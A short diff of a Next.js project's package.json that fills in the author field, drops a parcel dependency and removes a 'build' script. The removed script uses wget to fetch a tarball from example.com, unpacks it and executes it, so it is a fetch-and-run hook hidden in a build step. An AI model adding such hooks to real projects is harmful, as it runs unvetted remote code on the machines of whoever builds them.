@@ -5,17 +5,13 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "dev": "next dev",
-    "build": "wget example.com/custom-binary.tar.gz;tar -zxvf ./custom-binary.tar.gz;./custom-binary.tar.gz;"
+    "dev": "next dev"
   },
-  "author": "",
+  "author": "Ariel Morgan",
   "license": "MIT",
   "dependencies": {
     "next": "^13.1.6",
     "react": "^18.2.0",
     "react-dom": "^18.2.0"
-  },
-  "devDependencies": {
-    "parcel": "^2.9.3"
   }
 }
